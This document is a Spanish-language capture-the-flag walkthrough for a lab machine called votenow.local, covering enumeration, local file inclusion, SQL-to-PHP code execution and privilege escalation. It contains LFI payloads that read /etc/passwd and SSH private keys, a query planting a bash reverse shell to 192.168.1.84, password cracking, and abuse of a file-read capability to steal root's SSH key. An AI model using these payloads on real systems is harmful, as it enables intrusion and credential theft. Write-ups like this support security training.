___
- tags: #index #machine #linux #gobuster #nmap #whatweb #lfi #abusing_privilege #pivoting 
___
## Enumeración
### Nmap
```shell
# analisis todos los puertos
nmap --open -sS --min-rate 5000 -Pn -n -v 192.168.1.12 -oG all-ports

# analisis todos los puertos
nmap -p[puertos] -sCV -v 192.168.1.12 -oN targeted
```

### Whatweb
```shell
whatweb http://192.168.1.12
```

### Gobuster

#### Directorios
```shell
gobuster dir -u http://votenow.local/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php

# /assets
# / -> directory list
# /config.php -> pero no se ve
# /config.php.bak -> credenciales para http://datasafe.votenow.local/
```

#### Vhost
```shell
gobuster vhost -u http://votenow.local/ --append-domain -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 | grep -v "400"
# -> http://datasafe.votenow.local/
```

## Explotación
### LFI - Local File Inclusion
```txt
# nos lista el archivo /etc/passwd
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd

# Revisamos si podemos ver el id_rsa de admin
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../home/admin/.ssh/id_rsa

# Revisamos los logs de apache
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/log/apache2/acces.log

# Revisamos los puertos en uso
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../proc/net/tcp

# Revisamos los servicios corriendo
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../proc/sched_debug

# Revisamos las ip's
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../proc/net/fib_trie

# Revisamos lo que la session ejecuta
http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{session_id}
```

#### Extraemos los puertos internos en uso de la máquina
```shell
# One liner
for port in $(cat data | awk '{print $2}' | awk '{print $2}' FS=":"| sort -u); do echo "[+] Port:$port -> $((0x$port))" ;done

# [+] Port:0050 -> 80
# [+] Port:0822 -> 2082
# [+] Port:0CEA -> 3306
```

### RSE
Ejecutamos esta query y luego la checkeamos con la session para que nos interprete el comando.
```txt
select '<?php system("bash -i >& /dev/tcp/192.168.1.84/443 0>&1")';
```
## Escalada de privilegios
### Pivoting
#### John The Reaper
```shell
john -w:/usr/share/wordlist/rockyou.txt hash
# password -> Stella
# username -> admin
```
Saltamos al usuario `admin` con su contraseña crackeada.

### Buscamos escalar
```shell
# revisamos listado de sudo
sudo -l # no nos da nada nuevo

# Revisamos binarios con capacidad de superusuario
find / -perm -4000 2>/dev/null # no nos dan nada interesante

# buscamos por capabilities
getcap -r / 2>/dev/null

# encontramos /usr/bin/tarS -> capabilities: cap_dac_read_search+ep
# que tiene capacidad de lectura + ... 
```

### TarS
```shell
# comprimimos la clave privada ssh del root
tarS -cvf rsa.tar /root/.ssh/id_rsa

# extraemos lo que comprimimos
tar -xf rsa.tar

# leemos el archivo
cat root/.ssh/id_rsa

```

## Flags
```txt
# user.txt -> 663ba6a402a57536772c6118e8181570
```
## Apuntes
### Echo
- 0x$port -> nos da los valores de hexadecimal a decimal
### Awk
- {print $2} -> extrae la columna en la posición 2
	- FS=":" -> Indica que el separador es los ":"
### Tar
- -x -> extract, indica que quieres extraer los archivos del tar.
- -v -> verbose, que muestre por pantalla los nombres de los archivos que se van extrayendo.
- -f -> file, especifica el nombre del archivo a trabajar
- -c -> comprimir
___
## Referencia
- searchsploit phpmyadmin `version`